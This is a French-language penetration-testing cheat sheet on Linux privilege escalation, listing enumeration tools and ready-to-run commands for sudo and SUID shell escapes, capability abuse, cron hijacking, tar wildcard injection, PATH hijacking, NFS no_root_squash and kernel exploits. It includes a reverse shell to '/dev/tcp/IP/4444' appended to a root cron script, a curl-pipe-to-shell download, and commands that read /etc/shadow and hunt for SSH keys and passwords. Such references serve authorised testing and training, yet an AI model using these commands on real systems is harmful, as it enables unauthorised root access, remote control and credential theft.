# Privilege Escalation - Linux

## Methodologie

1. Enumeration automatisee (LinPEAS, LinEnum)
2. Verifier sudo, SUID, capabilities
3. Taches cron
4. Fichiers sensibles lisibles
5. Services internes
6. Kernel exploits (dernier recours)

## Outils d'enumeration

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

## Vecteurs d'escalade

### Sudo

```bash
sudo -l                  # Lister les commandes autorisees

# Exploiter (voir GTFOBins)
sudo vim -c '!bash'
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
```

**GTFOBins** : https://gtfobins.github.io/

### SUID

```bash
find / -perm -4000 -type f 2>/dev/null

# Exemples d'exploitation
# Si /usr/bin/python3 est SUID :
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### Capabilities

```bash
getcap -r / 2>/dev/null

# Exemple : python3 avec cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
# Chercher des scripts modifiables executes par root
# Si un cron execute un script writable :
echo 'bash -i >& /dev/tcp/IP/4444 0>&1' >> /chemin/script.sh
```

### Wildcard injection

```bash
# Si un cron fait : tar czf backup.tar.gz *
# Dans le repertoire concerne :
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

### PATH hijacking

```bash
# Si un binaire SUID appelle une commande sans chemin absolu
echo '/bin/bash -p' > /tmp/commande
chmod +x /tmp/commande
export PATH=/tmp:$PATH
./binaire_suid
```

### Fichiers sensibles

```bash
# Mots de passe dans les fichiers
grep -ri "password" /home /opt /var 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name ".bash_history" 2>/dev/null

# Cles SSH
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null

# /etc/shadow lisible ?
cat /etc/shadow
```

### NFS no_root_squash

```bash
# Sur la cible
cat /etc/exports    # Chercher no_root_squash

# Sur l'attaquant
showmount -e IP
mount -t nfs IP:/share /mnt
# Creer un binaire SUID
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
# Sur la cible
/share/bash -p
```

### Kernel exploits

```bash
uname -a
# Chercher des exploits pour la version du kernel
# DirtyPipe, DirtyCow, etc.
```
